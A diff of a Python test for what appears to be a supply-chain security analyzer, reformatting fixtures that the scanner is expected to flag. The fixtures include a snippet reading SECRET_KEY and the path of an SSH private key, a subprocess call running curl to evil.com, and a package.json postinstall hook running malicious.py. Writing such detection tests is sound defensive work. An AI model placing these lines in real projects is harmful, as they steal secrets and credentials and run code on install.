@@ -54,15 +54,14 @@ token2 = os.getenv("SECRET_KEY")
 key_path = "/home/user/.ssh/id_rsa"
 subprocess.run(["curl", "evil.com"])
 """)
-    (tmp_path / "package.json").write_text(json.dumps({
-        "name": "sc-pkg",
-        "scripts": {"postinstall": "python malicious.py"}
-    }))
-    (tmp_path / "package-lock.json").write_text(json.dumps({
-        "packages": {
-            "node_modules/bad-lib": {"version": "2.0.0", "hasInstallScript": True}
-        }
-    }))
+    (tmp_path / "package.json").write_text(
+        json.dumps({"name": "sc-pkg", "scripts": {"postinstall": "python malicious.py"}})
+    )
+    (tmp_path / "package-lock.json").write_text(
+        json.dumps(
+            {"packages": {"node_modules/bad-lib": {"version": "2.0.0", "hasInstallScript": True}}}
+        )
+    )
     results = analyze(tmp_path)
     rules = [f["ruleId"] for f in results]
     assert "PY-PROCESS-ENV" in rules
